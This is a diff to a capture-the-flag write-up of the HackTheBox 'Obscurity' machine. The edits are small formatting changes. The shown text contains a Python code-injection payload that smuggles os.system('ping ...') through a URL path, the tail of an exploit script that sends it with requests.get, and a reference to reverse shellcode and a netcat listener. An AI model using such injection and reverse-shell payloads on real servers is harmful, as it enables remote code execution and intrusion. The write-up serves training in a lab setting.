@@ -67,7 +67,7 @@ resp = requests.get(url+payload)
 
 So we just need to change the `path` to get RCE.
 
-```sh
+```
 # the desired output
 # ' import os;os.system("ping -c 2 10.10.15.95") a='
 # together:
@@ -76,7 +76,7 @@ path = '\'' + '\nimport os;os.system("ping -c 2 10.10.15.95")\na=\''
 
 ![Image](assets/img/writeups/hackthebox/obscurity/image-17.png)
 
-So all we need to do to get the reverse shell is to place some [Python reverse shellcode](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet).
+So all we need to do to get the reverse shell is to place some Python reverse shellcode (pentest monkey reverse shell cheat sheet).
 
 ```py
 #!/usr/bin/env python3
@@ -90,7 +90,3 @@ print("[+] Sending payload. \n[+] Check netcat listener")
 payload = urllib.parse.quote(path)
 resp = requests.get(url+payload)
 ```
-
-![Image](assets/img/writeups/hackthebox/obscurity/image-18.png)
-
-* * *
